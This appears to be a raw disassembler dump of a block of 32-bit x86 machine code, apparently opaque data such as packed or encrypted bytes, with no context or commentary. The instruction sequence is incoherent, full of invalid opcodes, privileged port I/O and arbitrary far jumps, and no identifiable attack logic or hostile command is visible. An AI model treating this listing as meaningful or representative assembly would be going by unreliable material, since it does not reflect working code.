  415cfa:	sub    DWORD PTR [ecx+ecx*8+0x49cb5fe],ebp
  415d01:	adc    eax,0x344d070e
  415d06:	in     al,0xa0
  415d08:	mov    ebx,0x99f63fd2
  415d0d:	mov    WORD PTR [ebp+ecx*4-0x49],es
  415d11:	sub    eax,0x746336ed
  415d16:	jae    0x415ca4
  415d18:	jp     0x415d79
  415d1a:	pop    esp
  415d1b:	mov    bl,0x51
  415d1d:	cli    
  415d1e:	out    dx,eax
  415d1f:	mov    eax,ds:0x93fac68c
  415d24:	xchg   ecx,eax
  415d25:	jnp    0x415da3
  415d27:	push   edx
  415d28:	push   esi
  415d29:	xor    eax,0x3be969bc
  415d2e:	mov    ebp,0x2a822a99
  415d33:	pop    ss
  415d34:	sti    
  415d35:	mov    al,ds:0x5e71a2fd
  415d3a:	and    al,0x8a
  415d3c:	les    edi,FWORD PTR [edx-0x2b786c2b]
  415d42:	dec    ebp
  415d43:	stc    
  415d44:	imul   ebx,ebx,0x1cc0f3a
  415d4a:	js     0x415d94
  415d4c:	(bad)  
  415d4d:	(bad)  
  415d4e:	test   al,0x77
  415d50:	cli    
  415d51:	outs   dx,BYTE PTR ds:[esi]
  415d52:	pop    edi
  415d53:	sahf   
  415d54:	call   0x36400420
  415d59:	push   ds
  415d5a:	sahf   
  415d5b:	mov    ecx,0xd0e357c7
  415d60:	imul   edx,esp,0xffffffc0
  415d63:	sub    DWORD PTR [ebx],ebp
  415d65:	aad    0x33
  415d67:	gs daa 
  415d69:	pushf  
  415d6a:	arpl   WORD PTR ds:0x3b4e9d5f,cx
  415d70:	and    esp,DWORD PTR [eax]
  415d72:	cmp    BYTE PTR [ecx+0x2fc373d3],bh
  415d78:	sbb    DWORD PTR [esi],edx
  415d7a:	out    dx,al
  415d7b:	fwait
  415d7c:	mov    bl,BYTE PTR [ecx+eiz*2-0x377684c6]
  415d83:	out    0x46,eax
  415d85:	mov    ebp,0x6722770
  415d8a:	mov    al,ds:0x87ede473
  415d8f:	aad    0xaf
  415d91:	jbe    0x415d33
  415d93:	mov    cs,WORD PTR [ebx-0xb]
  415d96:	fwait
  415d97:	rep stos DWORD PTR es:[edi],eax
  415d99:	jge    0x415d6b
  415d9b:	sti    
  415d9c:	mov    bh,0x37
  415d9e:	jnp    0x66bd549a
  415da4:	add    BYTE PTR [eax],al
  415da6:	sub    al,0xe0
  415da8:	(bad)  
  415da9:	push   ds
  415daa:	or     edx,eax
  415dac:	into   
  415dad:	call   0x2da296f2
  415db2:	imul   ecx,DWORD PTR [eax-0x5e03846b],0x42
  415db9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dba:	mov    ds:0x68ac4c7b,al
  415dbf:	scas   eax,DWORD PTR es:[edi]
  415dc0:	xor    DWORD PTR [ecx-0x79dcb1b2],ebx
  415dc6:	mov    ah,0x72
  415dc8:	dec    edx
  415dc9:	scas   al,BYTE PTR es:[edi]
  415dca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dcb:	push   eax
  415dcc:	dec    eax
  415dcd:	jne    0x415da3
  415dcf:	adc    ebx,0x58
  415dd2:	xchg   ebp,eax
  415dd3:	pop    esi
  415dd4:	sub    edx,ebp
  415dd6:	push   esp
  415dd7:	pop    edx
  415dd8:	out    dx,eax
  415dd9:	jno    0x415e31
  415ddb:	sub    DWORD PTR [esi],esi
  415ddd:	hlt    
  415dde:	mov    edx,0x5b58e8bc
  415de3:	test   edi,ebp
  415de5:	jmp    0x415dff
  415de7:	sub    ah,BYTE PTR [edx+0x49d65fd2]
  415ded:	retf   0xcaaf
  415df0:	iret   
  415df1:	imul   edi,DWORD PTR [eax],0xffffff91
  415df4:	stos   BYTE PTR es:[edi],al
  415df5:	jl     0x415e44
  415df7:	imul   ebp,DWORD PTR [ebx+0x10],0xf4f5c9cb
  415dfe:	fcmovu st,st(7)
  415e00:	lea    ebx,[eax+ebx*2]
  415e03:	cmp    edx,edx
  415e05:	push   cs
  415e06:	inc    ecx
  415e07:	inc    edi
  415e08:	sbb    DWORD PTR [edi-0x19817231],edx
  415e0e:	cmp    DWORD PTR [ecx+0x605be476],eax
  415e14:	or     DWORD PTR [ebx+edx*2],edi
  415e17:	xor    edx,edi
  415e19:	add    al,0xa3
  415e1b:	sub    bh,BYTE PTR [ebx-0x8d64072]
  415e21:	xlat   BYTE PTR ds:[ebx]
  415e22:	outs   dx,DWORD PTR ss:[esi]
  415e24:	stos   BYTE PTR es:[edi],al
  415e25:	xchg   DWORD PTR [edi+eax*4],eax
  415e28:	dec    esi
  415e29:	in     al,0x4b
  415e2b:	push   0xffffffca
  415e2d:	inc    esp
  415e2e:	sub    ebp,DWORD PTR [ecx+0x47]
  415e31:	sti    
  415e32:	dec    ebp
  415e33:	sbb    eax,0xc6543d53
  415e38:	mov    eax,ds:0xa1f50ce1
  415e3d:	mov    dl,0xff
  415e3f:	fstp   QWORD PTR [eax]
  415e41:	xchg   ebp,eax
  415e42:	add    eax,0xc35163eb
  415e47:	stos   DWORD PTR es:[edi],eax
  415e48:	in     eax,0xb5
  415e4a:	add    dl,BYTE PTR [edx]
  415e4c:	or     esp,edi
  415e4e:	aam    0xf5
  415e50:	lods   al,BYTE PTR ds:[esi]
  415e51:	add    al,0x8e
  415e53:	adc    DWORD PTR [ecx+0x7e512ef7],edi
  415e59:	cmovno edx,DWORD PTR [eax+eax*8]
  415e5d:	imul   edi,DWORD PTR [ebx-0x24a0a0aa],0xffffffa3
  415e64:	(bad)  
  415e65:	js     0x415ea6
  415e67:	mov    ebx,DWORD PTR ds:0x1c4143c3
  415e6d:	adc    BYTE PTR [esi-0x56],0x93
  415e71:	(bad)  
  415e72:	into   
  415e73:	ja     0x415ed7
  415e75:	cwde   
  415e76:	dec    ebp
  415e77:	push   esi
  415e78:	fcmovu st,st(5)
  415e7a:	mov    dh,0x7b
  415e7c:	dec    edx
  415e7d:	jno    0x415e0a
  415e7f:	dec    esi
  415e80:	scas   al,BYTE PTR es:[edi]
  415e81:	dec    esi
  415e82:	dec    esp
  415e83:	inc    esp
  415e84:	mov    es,WORD PTR [eax+0x5c7b9f1a]
  415e8a:	iret   
  415e8b:	cli    
  415e8c:	cmp    DWORD PTR [ecx+0xc75413a],edx
  415e92:	sub    DWORD PTR [edi-0x5ce2a7b2],edx
  415e98:	jno    0x415eb3
  415e9a:	sti    
  415e9b:	enter  0x363a,0x45
  415e9f:	mov    esi,0xa2054e56
  415ea4:	mov    eax,ds:0x911fcc68
  415ea9:	add    esp,DWORD PTR [eax+ecx*2+0x3b]
  415ead:	push   esp
  415eae:	add    BYTE PTR [ebp+0x48],ah
  415eb1:	fidiv  DWORD PTR [edi]
  415eb3:	or     eax,0x25cd7069
  415eb8:	push   edx
  415eb9:	das    
  415eba:	add    DWORD PTR [ecx-0x1b],eax
  415ebd:	mov    ds:0xb0caaea8,eax
  415ec2:	sub    DWORD PTR [edx+0x23],esi
  415ec5:	push   esp
  415ec6:	push   esi
  415ec7:	mov    ds:0x97f8f232,eax
  415ecc:	jb     0x415e66
  415ece:	push   ss
  415ecf:	pop    ecx
  415ed0:	push   ecx
  415ed1:	fidivr WORD PTR [edi+eiz*1-0x16e8679e]
  415ed8:	retf   0xd35
  415edb:	mov    ecx,0xc7aaf786
  415ee0:	jae    0x415f5b
  415ee2:	cmp    BYTE PTR [ebx+0x50],al
  415ee5:	push   ss
  415ee6:	test   eax,0x580d422c
  415eeb:	out    0x89,eax
  415eed:	arpl   WORD PTR [ebp+0x70],dx
  415ef0:	popa   
  415ef1:	std    
  415ef2:	jmp    0x415f57
  415ef4:	je     0x415ebd
  415ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ef7:	add    ch,BYTE PTR [eax]
  415ef9:	aas    
  415efa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415efb:	mov    eax,ds:0xc86a182b
  415f00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f01:	and    DWORD PTR [esi+0x33],ecx
  415f04:	repnz shr BYTE PTR [ecx+0x5c],1
  415f08:	pop    esi
  415f09:	sbb    BYTE PTR [edi+0x3698e71],0x11
  415f10:	mov    ecx,0x94703b7e
  415f15:	ret    0xd67
  415f18:	xor    edx,ebp
  415f1a:	lock xor eax,0xaa27505c
  415f20:	imul   BYTE PTR [eax-0x66a620ac]
  415f26:	pop    ss
  415f27:	jmp    0xbebf:0xf79eb6fd
  415f2e:	out    0xfd,eax
  415f30:	icebp  
  415f31:	fld    DWORD PTR [eax]
  415f33:	add    BYTE PTR [esi+0x6f],bh
  415f36:	aad    0x31
  415f38:	pop    es
  415f39:	out    dx,eax
  415f3a:	imul   ebx,edi,0x63ec9235
  415f40:	jecxz  0x415ed7
  415f42:	xor    al,0xae
  415f44:	or     eax,0x4519e296
  415f49:	sbb    ecx,DWORD PTR [edi]
  415f4b:	sbb    esi,DWORD PTR [eax+eiz*1+0x1e]
  415f4f:	retf   
  415f50:	mov    bh,0xa5
  415f52:	ins    DWORD PTR es:[edi],dx
  415f53:	rcr    BYTE PTR [edi+0x55],cl
  415f56:	ss adc eax,0x6dafd68c
  415f5c:	sub    esi,DWORD PTR [ebp+0x54]
  415f5f:	les    edx,FWORD PTR [esi+eax*1-0x5d]
  415f63:	xor    DWORD PTR [edi],esi
  415f65:	out    dx,eax
  415f66:	and    eax,0x403864cd
  415f6b:	and    esi,edx
  415f6d:	xor    DWORD PTR [edx+0x0],ebp
  415f70:	push   ds
  415f71:	mov    bh,0x29
  415f73:	shl    DWORD PTR [eax-0x79c14c4f],cl
  415f79:	adc    esp,ebp
  415f7b:	xlat   BYTE PTR ds:[ebx]
  415f7c:	push   esp
  415f7d:	mov    edi,0xbf2f1d0d
  415f82:	mov    ds:0xade35417,eax
  415f87:	and    dh,BYTE PTR [edi]
  415f89:	xor    BYTE PTR [ebp+0x3045d670],bl
  415f8f:	cwde   
  415f90:	nop
  415f91:	ss aad 0x50
  415f94:	popf   
  415f95:	xor    dl,BYTE PTR [ebx-0x7f]
  415f98:	and    al,BYTE PTR es:[edi]
  415f9b:	push   0x723aaa32
  415fa0:	and    DWORD PTR [ebp-0x2f],0x10
  415fa4:	imul   edx,DWORD PTR [edx-0x26],0x512fa352
  415fab:	ins    DWORD PTR es:[edi],dx
  415fac:	hlt    
  415fad:	jae    0x415f32
  415faf:	leave  
  415fb0:	dec    edx
  415fb1:	adc    eax,0x3dd795db
  415fb6:	mov    ds:0xee356dd2,eax
  415fbb:	sub    al,BYTE PTR [esi-0x7f]
  415fbe:	popf   
  415fbf:	inc    eax
  415fc0:	ss repnz cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  415fc4:	lods   al,BYTE PTR ds:[esi]
  415fc5:	pop    ebp
  415fc6:	pop    ds
  415fc7:	leave  
  415fc8:	cli    
  415fc9:	xor    al,0xdc
  415fcb:	and    bl,BYTE PTR [ebx-0x4d5c6af]
  415fd1:	push   ecx
  415fd2:	adc    BYTE PTR [ecx-0x7d],dl
  415fd5:	hlt    
  415fd6:	lock scas eax,DWORD PTR es:[edi]
  415fd8:	fs daa 
  415fda:	out    dx,al
  415fdb:	mov    ecx,0xe5500e4b
  415fe0:	mov    eax,ds:0x9302b821
  415fe5:	jnp    0x41605c
  415fe7:	aad    0x73
  415fe9:	mov    ebp,0xfb259947
  415fee:	jp     0x41603b
  415ff0:	(bad)  
  415ff2:	mov    ds:0x9ca05e0c,eax
  415ff7:	mov    cl,0xe2
  415ff9:	cwde   
  415ffa:	sbb    DWORD PTR [ebp+0x14235dce],0xffffffde
  416001:	arpl   WORD PTR [ebp+0x7d],si
  416004:	lods   eax,DWORD PTR ds:[esi]
  416005:	mov    ch,BYTE PTR [ecx-0x10b5576d]
  41600b:	(bad)  
  41600c:	pop    ecx
  41600d:	lds    ebp,FWORD PTR [eax]
  41600f:	dec    edx
  416010:	shl    BYTE PTR [eax-0x66],cl
  416013:	xor    esp,edi
  416015:	loope  0x41605a
  416017:	popf   
  416018:	xor    BYTE PTR [edi],al
  41601a:	es mov dh,0x53
  41601d:	pop    ecx
  41601e:	lahf   
  41601f:	xchg   esp,eax
  416020:	(bad)  
  416021:	sub    bh,BYTE PTR [ebx]
  416023:	mov    eax,ecx
  416025:	inc    ebx
  416026:	push   es
  416027:	idiv   BYTE PTR [ecx+0x6356bfee]
  41602d:	cwde   
  41602e:	adc    al,BYTE PTR ds:0xd56b90b
  416034:	ret    0x60eb
  416037:	aas    
  416038:	dec    edx
  416039:	jno    0x416057
  41603b:	or     eax,0x22624c99
  416040:	jb     0x41601c
  416042:	retf   
  416043:	sti    
  416044:	imul   ebx,DWORD PTR [eax+0x34],0xbafbe48
  41604b:	adc    ecx,DWORD PTR [ebx-0x47]
  41604e:	test   eax,0xa8b19342
  416053:	icebp  
  416054:	bnd jnp 0x4160d1
  416057:	jnp    0x41604f
  416059:	xchg   ebx,eax
  41605a:	ins    DWORD PTR es:[edi],dx
  41605b:	aam    0x91
  41605d:	sbb    ebp,DWORD PTR [eiz*2+0x458b90c1]
  416064:	out    0x93,eax
  416066:	mov    dl,0x9c
  416068:	xchg   esp,eax
  416069:	jmp    FWORD PTR [eax]
  41606b:	fwait
  41606c:	inc    esp
  41606d:	pushfw 
  41606f:	ja     0x41608b
  416071:	mov    DWORD PTR [edx],eax
  416073:	mov    WORD PTR [esi-0x159b91d3],es
  416079:	inc    esp
  41607a:	xchg   esp,eax
  41607b:	jge    0x4160a7
  41607d:	gs ja  0x41605d
  416080:	push   edx
  416081:	and    esp,DWORD PTR [esp+ebp*4+0x41cc315b]
  416088:	test   al,0xe7
  41608a:	ja     0x4160b2
  41608c:	stos   BYTE PTR es:[edi],al
  41608d:	jp     0x416034
  41608f:	in     eax,dx
  416090:	repz sbb dh,BYTE PTR ds:0x3b459750
  416097:	jb     0x4160ef
  416099:	ret    0xaa7b
  41609c:	sbb    BYTE PTR [ebp-0x32],bh
  41609f:	inc    edx
  4160a0:	or     eax,0xeb54f558
  4160a5:	push   edi
  4160a6:	cmp    DWORD PTR [edx+esi*1+0x47],edx
  4160aa:	ins    BYTE PTR es:[edi],dx
  4160ab:	mov    bl,0x19
  4160ad:	jns    0x4160ad
  4160af:	mov    WORD PTR [ebx-0x10],fs
  4160b2:	cmp    bl,BYTE PTR [ebp+0x57]
  4160b5:	inc    ebx
  4160b6:	ds mov edi,0x251f8c4a
  4160bc:	jnp    0x416041
  4160be:	mov    dl,0xf6
  4160c0:	nop
  4160c1:	lds    eax,FWORD PTR [edi]
  4160c3:	sbb    edi,DWORD PTR [ebp+0x5521154b]
  4160c9:	lock adc DWORD PTR [ebx-0x10f550f8],esp
  4160d0:	popf   
  4160d1:	test   eax,0xf14e4044
  4160d6:	sub    BYTE PTR [esi+ecx*1],bl
  4160d9:	ins    BYTE PTR es:[edi],dx
  4160da:	and    dh,BYTE PTR [edx+0x43]
  4160dd:	ror    DWORD PTR [ecx-0x57],1
  4160e0:	arpl   WORD PTR [edx+eiz*2+0x4a2aaa29],dx
  4160e7:	ja     0x4160d5
  4160e9:	jae    0x416115
  4160eb:	nop
  4160ec:	add    al,BYTE PTR [edx]
  4160ee:	(bad)  
  4160ef:	mov    DWORD PTR cs:[ecx+0x42],esp
  4160f3:	push   eax
  4160f4:	test   eax,0xa2b62965
  4160f9:	loopne 0x416114
  4160fb:	inc    ebx
  4160fc:	aaa    
  4160fd:	bound  ecx,QWORD PTR [eax-0x49]
  416100:	pop    ebp
  416101:	mov    DWORD PTR [edi+ebx*2+0x8570b2a],esi
  416108:	jp     0x4160ef
  41610a:	test   eax,0x8e8343c8
  41610f:	pop    ebp
  416110:	scas   eax,DWORD PTR es:[edi]
  416111:	hlt    
  416112:	push   esi
  416113:	adc    eax,0xb9a20a8b
  416118:	adc    esp,DWORD PTR [edi+0xf8c5591]
  41611e:	jne    0x4160d4
  416120:	das    
  416121:	jmp    0x3dfe:0x7fa4269d
  416128:	jmp    0x416151
  41612a:	loopne 0x416194
  41612c:	jl     0x41617d
  41612e:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416130:	mov    WORD PTR [eax],gs
  416132:	ret    
  416133:	pop    edx
  416134:	out    dx,al
  416135:	mov    eax,ds:0xe71d790c
  41613a:	je     0x416116
  41613c:	jmp    0xd022:0xdd75a357
  416143:	mov    cl,0xaf
  416145:	or     bl,BYTE PTR [edx]
  416147:	ins    BYTE PTR es:[edi],dx
  416148:	outs   dx,DWORD PTR ds:[esi]
  416149:	inc    ebx
  41614a:	in     al,0x2c
  41614c:	lods   al,BYTE PTR ds:[esi]
  41614d:	adc    edi,DWORD PTR [ecx+0x7e]
  416150:	ret    0x56e7
  416153:	pop    ecx
  416154:	and    eax,0x54dc13de
  416159:	push   edi
  41615a:	mov    ch,0xff
  41615c:	cmp    al,BYTE PTR [edi]
  41615e:	and    eax,0xa3b0d110
  416163:	in     al,0x50
  416165:	and    esi,edx
  416167:	nop
  416168:	mov    al,0x11
  41616a:	mov    ds:0x9be1e43a,eax
  41616f:	mov    dl,0xa
  416171:	mov    bh,0x45
  416173:	xchg   ebp,eax
  416174:	push   ebx
  416175:	fdiv   DWORD PTR [edi+0x1c]
  416178:	arpl   WORD PTR [edx+ebx*1],si
  41617b:	mov    cl,0x75
  41617d:	imul   esi
  41617f:	inc    edi
  416180:	pop    es
  416181:	add    BYTE PTR [esp+eax*1],ah
  416184:	idiv   ebp
  416186:	repnz repnz cwde 
  416189:	jmp    0x694e:0xf4a754ce
  416190:	or     edx,DWORD PTR [ebp-0x5a2e755d]
  416196:	sbb    edx,DWORD PTR ds:0x84b4150a
  41619c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41619d:	sub    bl,BYTE PTR [eax]
  41619f:	push   edx
  4161a0:	dec    ecx
  4161a1:	dec    esi
  4161a2:	lods   al,BYTE PTR ds:[esi]
  4161a3:	or     bl,BYTE PTR [esi-0x6d]
  4161a6:	sub    al,0x11
  4161a8:	mov    ecx,0x41f878a1
  4161ad:	ror    DWORD PTR [esi-0xc],0xff
  4161b1:	mov    esi,0x1028d76b
  4161b6:	mov    ah,0x22
  4161b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161b9:	mov    edx,DWORD PTR [ebx+0x2a0cb391]
  4161bf:	add    edi,ebx
  4161c1:	mov    dl,0x5e
  4161c3:	add    al,0xbd
  4161c5:	dec    ecx
  4161c6:	out    dx,al
  4161c7:	out    0x35,eax
  4161c9:	mov    dh,ah
  4161cb:	sahf   
  4161cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161cd:	pusha  
  4161ce:	jge    0x4161bd
  4161d0:	enter  0x9b3d,0x82
  4161d4:	pop    ebx
  4161d5:	sub    eax,0xa7a35372
  4161da:	pop    esp
  4161db:	sbb    al,0x40
  4161dd:	jns    0x41625c
  4161df:	inc    esp
  4161e0:	dec    esi
  4161e1:	ja     0x4161b8
  4161e3:	jo     0x4161ff
  4161e5:	sar    BYTE PTR [esi+0x3b],cl
  4161e8:	inc    esi
  4161e9:	push   edi
  4161ea:	arpl   WORD PTR [edx+0x69ec0518],bp
  4161f0:	stc    
  4161f1:	mov    WORD PTR [ebp+0x6b],gs
  4161f4:	sar    esp,1
  4161f6:	mov    edx,ecx
  4161f8:	xchg   esp,eax
  4161f9:	jp     0x4161bc
  4161fb:	cmp    bl,ch
  4161fd:	mov    bl,0x29
  4161ff:	enter  0x386a,0xa6
  416203:	int3   
  416204:	sub    DWORD PTR [edx],esp
  416206:	pop    es
  416207:	dec    esp
  416208:	into   
  416209:	cmp    eax,0xf2373fee
  41620e:	add    edx,DWORD PTR [ebx-0x29]
  416211:	dec    ebx
  416212:	aas    
  416213:	aam    0x69
  416215:	nop
  416216:	push   ebp
  416217:	stc    
  416218:	sbb    al,0xfa
  41621a:	mov    esp,0xb8e93eaa
  41621f:	or     DWORD PTR [esi],edx
  416221:	adc    DWORD PTR [ebx+0x25868621],esp
  416227:	jmp    0x773b:0x327eb5a1
  41622e:	ds push cs
  416230:	jmp    0xe709:0xe9b51064
  416237:	xchg   ebp,eax
  416238:	cmp    dl,ch
  41623a:	nop
  41623b:	iret   
  41623c:	adc    al,0x88
  41623e:	xchg   ebp,eax
  41623f:	std    
  416240:	test   al,0xcc
  416242:	aam    0x5e
  416244:	pop    ecx
  416245:	pop    edi
  416246:	mov    ds:0x98b7fc67,eax
  41624b:	icebp  
  41624c:	mov    ds:0xf2807c8c,eax
  416251:	out    dx,al
  416252:	ja     0x416210
  416254:	sti    
  416255:	loopne 0x4162ae
  416257:	aas    
  416258:	cld    
  416259:	test   DWORD PTR [ebx+0x14037a0e],0xc6a83b06
  416263:	shl    DWORD PTR [ecx-0x5c61c27a],cl
  416269:	sub    BYTE PTR [eax],0x22
  41626c:	sub    cl,BYTE PTR [ebx-0x5ed26bb0]
  416272:	imul   esp,DWORD PTR [edi],0x46
  416275:	add    eax,0xaac9a40
  41627a:	(bad)
  41627d:	adc    eax,DWORD PTR [ebx-0x76]
  416280:	retf   0xbefa
  416283:	(bad)  
  416285:	or     al,0x7f
  416287:	xchg   edi,eax
  416288:	enter  0x5664,0xd2
  41628c:	pop    es
  41628d:	push   ebp
  41628e:	xchg   esi,eax
  41628f:	cmc    
  416290:	xor    bl,BYTE PTR [esi]
  416292:	cmc    
  416293:	or     bl,dl
  416295:	aaa    
  416296:	mov    dh,0xa3
  416298:	retf   0xdfa8
  41629b:	jnp    0x416249
  41629d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41629e:	or     BYTE PTR [esi+0x7bbdd8d4],ch
  4162a4:	inc    esp
  4162a5:	mov    esi,0xb23ec3ac
  4162aa:	lahf   
  4162ab:	sub    eax,0x4e815eb9
  4162b0:	add    edx,esp
  4162b2:	fdiv   st(6),st
  4162b4:	cmp    BYTE PTR ds:0x86f7502c,dl
  4162ba:	enter  0x9c0d,0xb2
  4162be:	out    0xbc,eax
  4162c0:	push   ecx
  4162c1:	xchg   BYTE PTR [esi],bl
  4162c3:	jnp    0x41626f
  4162c5:	inc    edi
  4162c6:	gs sbb ebp,esi
  4162c9:	add    BYTE PTR [esi+edi*1-0x480981f9],dh
  4162d0:	add    al,0x1c
  4162d2:	popf   
  4162d3:	enter  0x3c3,0xea
  4162d7:	rcl    DWORD PTR [edi+edi*2+0x1c],cl
  4162db:	test   al,0x6f
  4162dd:	arpl   di,di
  4162df:	sti    
  4162e0:	or     eax,0xebea0b26
  4162e5:	inc    esp
  4162e6:	call   FWORD PTR [edx]
  4162e8:	xchg   edi,eax
  4162e9:	mov    edi,0x3c7519b2
  4162ee:	retf   0xf476
  4162f1:	pop    edx
  4162f2:	neg    esp
  4162f4:	or     al,BYTE PTR [edx]
  4162f6:	sbb    al,0x97
  4162f8:	mov    dl,0x21
  4162fa:	add    eax,0xd71bb57d
  4162ff:	loope  0x416353
  416301:	sbb    ebx,DWORD PTR [esi]
  416303:	shl    BYTE PTR [esp+ebp*8+0x73],cl
  416307:	retf   0xd94b
  41630a:	test   DWORD PTR [edx-0x62e428fd],esi
  416310:	jmp    0x41638b
  416312:	xchg   edx,eax
  416313:	hlt    
  416314:	repz push edx
  416316:	cld    
  416317:	adc    BYTE PTR ds:0x98f60d2d,ah
  41631d:	inc    eax
  41631e:	mov    bl,0xc7
  416320:	add    al,0x68
  416322:	fcomp  DWORD PTR [eax+eiz*1+0x7a8b0a17]
  416329:	jo     0x416390
  41632b:	add    bl,BYTE PTR [edx]
  41632d:	dec    edi
  41632e:	imul   esp,DWORD PTR [edi],0x136a71e9
  416334:	inc    esi
  416335:	and    eax,0x9d6d12f5
  41633a:	push   0xffffff87
  41633c:	pop    esp
  41633d:	mov    ds:0x5f153471,eax
  416342:	xchg   ebp,eax
  416343:	inc    edi
  416344:	test   DWORD PTR [edx-0x539f787],ebp
  41634a:	dec    esi
  41634b:	rcr    eax,cl
  41634d:	es jmp 0x9b3a80b8
  416353:	scas   eax,DWORD PTR es:[edi]
  416354:	(bad)  
  416355:	pop    ecx
  416356:	cmp    cl,BYTE PTR [ecx+0x3a]
  416359:	and    DWORD PTR [edi+eiz*2+0x5a],ebp
  41635d:	(bad)  
  41635e:	jae    0x41637c
  416360:	cmp    bh,BYTE PTR [ecx-0x6c]
  416363:	lea    edx,[edx+0x43]
  416366:	sbb    eax,0x768d329f
  41636b:	in     al,0x7d
  41636d:	push   ebp
  41636e:	xchg   BYTE PTR [eax-0x46e25ca2],ah
  416374:	daa    
  416375:	push   esi
  416376:	out    dx,eax
  416377:	stos   BYTE PTR es:[edi],al
  416378:	repz dec eax
  41637a:	add    BYTE PTR [edx],ah
  41637c:	jnp    0x4163ce
  41637e:	cli    
  41637f:	scas   eax,DWORD PTR es:[edi]
  416380:	xlat   BYTE PTR ds:[ebx]
  416381:	mov    ch,0x62
  416383:	xor    al,0x2f
  416385:	mov    al,ds:0x61db0321
  41638a:	aas    
  41638b:	sub    bh,al
  41638d:	xchg   edx,eax
  41638e:	outs   dx,BYTE PTR ds:[esi]
  41638f:	dec    esp
  416390:	inc    esp
  416391:	mov    esi,0x5179cf06
  416396:	jns    0x416413
  416398:	sbb    eax,0x30863fd4
  41639d:	push   ebp
  41639e:	mov    WORD PTR [esi],?
  4163a0:	mov    ecx,0x494f3ec8
  4163a5:	fstp   QWORD PTR [edi+esi*1+0x77af1b95]
  4163ac:	add    ch,dh
  4163ae:	lock leave 
  4163b0:	cdq    
  4163b1:	or     DWORD PTR [ebp-0x5f],esp
  4163b4:	mov    eax,ds:0x1c63ca84
  4163b9:	dec    eax
  4163ba:	test   al,0x8e
  4163bc:	sub    DWORD PTR [ebx],ecx
  4163be:	in     al,dx
  4163bf:	fdivr  st,st(5)
  4163c1:	cs daa 
  4163c3:	addr16 or al,0xa5
  4163c6:	xor    BYTE PTR [ebx-0x51bc1097],bh
  4163cc:	inc    ecx
  4163cd:	std    
  4163ce:	(bad)  
  4163cf:	data16 cld 
  4163d1:	sub    BYTE PTR [ebx-0x41],ah
  4163d4:	pusha  
  4163d5:	stc    
  4163d6:	xchg   ebx,eax
  4163d7:	rcl    esi,cl
  4163d9:	sbb    eax,0xe9bae2bc
  4163de:	int3   
  4163df:	jecxz  0x41644c
  4163e1:	and    ecx,DWORD PTR [edx+0x2f]
  4163e4:	aad    0x33
  4163e6:	jp     0x4163b9
  4163e8:	cmp    BYTE PTR [ebp+0x26e7a242],bl
  4163ee:	jb     0x41642b
  4163f0:	dec    edx
  4163f1:	sub    dl,al
  4163f3:	clc    
  4163f4:	inc    esp
  4163f5:	dec    esi
  4163f6:	enter  0xcdbd,0x18
  4163fa:	jge    0x4163d0
  4163fc:	push   esp
  4163fd:	inc    ecx
  4163fe:	xchg   ebp,esi
  416400:	aam    0x31
  416402:	dec    esp
  416403:	mov    dl,0x6d
  416405:	mov    WORD PTR [ebp+esi*4-0x506eab60],ds
  41640c:	fldenv [ebx-0x4d558d70]
  416412:	sub    cl,BYTE PTR [edx+0x1f1c6fb3]
  416418:	fld    DWORD PTR [edx+0x58027fd2]
  41641e:	sub    eax,0xe7b8a0f5
  416423:	push   edi
  416424:	stc    
  416425:	call   0x6c407f11
  41642a:	pop    esp
  41642b:	xlat   BYTE PTR ds:[ebx]
  41642c:	xchg   esp,eax
  41642d:	(bad)  
  41642e:	xor    cl,BYTE PTR [edi-0x795d3520]
  416434:	dec    esi
  416435:	xchg   esi,eax
  416436:	xor    dl,BYTE PTR ds:0x8ad54879
  41643c:	fdivr  QWORD PTR [ebx-0x766b9050]
  416442:	xchg   BYTE PTR [ecx+0x4],dl
  416445:	xchg   esi,eax
  416446:	push   esi
  416447:	in     al,0x74
  416449:	mov    ah,0x15
  41644b:	cmp    DWORD PTR [eax+0x46],ebx
  41644e:	or     al,0x19
  416450:	xchg   ecx,eax
  416451:	rcr    BYTE PTR [eax+0x67],cl
  416454:	inc    esi
  416455:	pushf  
  416456:	inc    edi
  416457:	iret   
  416458:	jnp    0x41648e
  41645a:	arpl   WORD PTR [esp],dx
  41645d:	cmp    al,0x2f
  41645f:	mov    al,ds:0x70f7878c
  416464:	mov    esi,0x819dc8aa
  416469:	jmp    0x9e88:0xca75d28b
  416470:	fdivr  st(3),st
  416472:	sub    BYTE PTR [edx],cl
  416474:	fdiv   DWORD PTR [ebp-0x1c]
  416477:	and    BYTE PTR [ecx+0x5eec262c],0x95
  41647e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41647f:	mov    dl,0x14
  416481:	jmp    0x3af5:0x9ef0a358
  416488:	adc    BYTE PTR [ecx+0x286039dd],ch
  41648e:	pop    ebx
  41648f:	push   eax
  416490:	push   esi
  416491:	cmp    edi,0xafc258b7
  416497:	push   esp
  416498:	jle    0x416481
  41649a:	add    eax,0x71036028
  41649f:	rep lods eax,DWORD PTR ds:[esi]
  4164a1:	jno    0x416506
  4164a3:	sti    
  4164a4:	mov    dh,0x22
  4164a6:	test   DWORD PTR [edx-0x39],esp
  4164a9:	adc    eax,0x1c48548d
  4164ae:	mov    BYTE PTR [edx],bl
  4164b0:	or     bh,bl
  4164b2:	push   ebx
  4164b3:	mov    eax,0xe475200a
  4164b8:	emms   
  4164ba:	call   0x5cdacfbf
  4164bf:	sub    cl,BYTE PTR [eax+0x15]
  4164c2:	mov    ecx,0xa5eb0f1
  4164c7:	xchg   edi,eax
  4164c8:	ret    0x949b
  4164cb:	cli    
  4164cc:	fxch   st(7)
  4164ce:	pop    edx
  4164cf:	fisub  DWORD PTR [ebp-0x5c0a78ae]
  4164d5:	and    esi,ebp
  4164d7:	stos   BYTE PTR es:[edi],al
  4164d8:	xchg   edi,eax
  4164d9:	push   edx
  4164da:	cmp    ch,BYTE PTR [esp+esi*4+0x7a87994f]
